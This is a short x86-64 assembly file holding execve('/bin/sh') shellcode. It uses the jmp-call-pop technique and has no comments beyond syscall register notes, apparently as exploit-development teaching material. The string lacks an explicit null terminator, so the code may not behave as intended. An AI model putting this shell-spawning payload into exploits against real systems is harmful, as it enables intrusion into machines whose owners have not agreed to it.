
.globl _start

# rdi rsi rdx
# 59	sys_execve	const char *filename	const char *const argv[]	const char *const envp[]

_start:
    jmp     call_shellcode

shellcode:
    xor     %rdi, %rdi
    pop     %rdi            # string into first param

    xor     %rsi, %rsi      # null for second param
    xor     %rdx, %rdx      # null for third param

    xor     %rax, %rax
    add     $59, %rax       # syscall for execve
    syscall

call_shellcode:
    call    shellcode
    .ascii  "/bin/sh"
